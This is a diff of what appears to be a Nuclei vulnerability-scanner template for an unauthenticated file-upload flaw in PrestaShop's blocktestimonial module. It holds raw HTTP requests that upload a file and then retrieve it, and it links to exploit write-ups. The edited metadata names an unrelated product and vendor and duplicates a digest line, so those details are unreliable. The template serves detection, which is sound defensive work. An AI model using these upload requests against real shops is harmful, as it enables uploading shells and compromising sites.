@@ -1,5 +1,4 @@
 id: prestashop-blocktestimonial-file-upload
-
 info:
   name: Prestashop Blocktestimonial Modules - File Upload Vulnerability
   author: MaStErChO
@@ -8,18 +7,36 @@ info:
     - https://3xploit7.blogspot.com/2016/12/pretashop-blocktestimonial-upload-shell.html
     - https://github.com/indoxploit-coders/blocktestimonial-file-upload
     - https://exploit.linuxsec.org/prestashop-module-blocktestimonial-file-upload-auto-exploit
+  classification:
+    cwe-id:
+      - CWE-434
   metadata:
-    max-request: 2
+    runzero-review: REJECT/2025-11-07/excluding tag intrusive
     framework: prestashop
-    shodan-query: "http.component:\"prestashop\""
-  tags: intrusive,file-upload,blocktestimonial,prestashop
-
+    max-request: 2
+    product: ap_pagebuilder
+    shodan-query: http.component:"prestashop"
+    vendor: apollotheme
+  tags: blocktestimonial,file-upload,intrusive,prestashop,vuln
 variables:
-  filename: '{{rand_base(7, "abc")}}'
   data: '{{rand_base(6, "abc")}}'
-
+  filename: '{{rand_base(7, "abc")}}'
 http:
-  - raw:
+  - host-redirects: true
+    matchers:
+      - part: body_1
+        type: word
+        words:
+          - Your testimonial was submitted successfully.
+      - part: body_2
+        type: word
+        words:
+          - '{{data}}'
+          # digest: 490a0046304402201723102f369056843fe0785ff7f967fdda759a217f3e8b0efac48ddd814446b702205024b865c3feaca9980b9116bc04a03175fb977f1e623599172ef07d3f64f8d3:922c64590222798bb761d5b6d8e72950
+        # digest: 490a0046304402201723102f369056843fe0785ff7f967fdda759a217f3e8b0efac48ddd814446b702205024b865c3feaca9980b9116bc04a03175fb977f1e623599172ef07d3f64f8d3:922c64590222798bb761d5b6d8e72950
+    matchers-condition: and
+    max-redirects: 3
+    raw:
       - |
         POST /modules/blocktestimonial/addtestimonial.php HTTP/1.1
         Host: {{Hostname}}
@@ -52,20 +69,6 @@ http:
 
         Submit Testimonial
         ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl--
-
       - |
         GET /upload/{{filename}}.html HTTP/1.1
         Host: {{Hostname}}
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body_1
-        words:
-          - "Your testimonial was submitted successfully."
-
-      - type: word
-        part: body_2
-        words:
-          - "{{data}}"
-# digest: 4a0a00473045022100f06f7891c9ab826fd695e459a01cf8aa08cb935526a03d4682f3d2b51b1232b602201c0324d3b39d3864679abdba6fc041f0952695bc744d840c0105e6c9bf424318:922c64590222798bb761d5b6d8e72950
